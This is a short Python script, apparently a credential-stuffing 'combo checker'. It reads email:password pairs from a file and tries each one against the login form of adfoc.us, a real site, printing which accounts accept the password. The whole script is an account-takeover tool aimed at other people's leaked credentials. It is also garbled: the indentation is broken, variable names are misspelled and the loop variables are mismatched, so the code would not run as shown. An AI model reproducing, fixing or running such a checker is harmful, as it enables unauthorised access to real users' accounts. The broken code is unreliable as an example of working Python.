import requests

def failed (email, passwrd):
  print  ( f" login failled Using E: {email} and P:{passwrd}" )

def passed (email, password):
   print(f" login success Using E: {email} and P:{password}")



def checker (data):
            email = data[0]
            password = data[1]
          success_keyword = """"<strong>today's Earnings:</strong>"""
         api_sender = requests.session()
    source = api_sender.post("https://adfoc.us/session/create", data= {"email": email,
                                                                     "password": password}).text
 if  success_keyoword  in source:
     passed(email, password)

 else: failed(email, password)


combo_name = input (" Por favor entre com o nome do combo:")
combos = open(combos name, "r").readlines()
arrange = (lines.replace("\n", "")for line in combos)
for lines in arrange:
    data = lines.split(":")
    checker(data)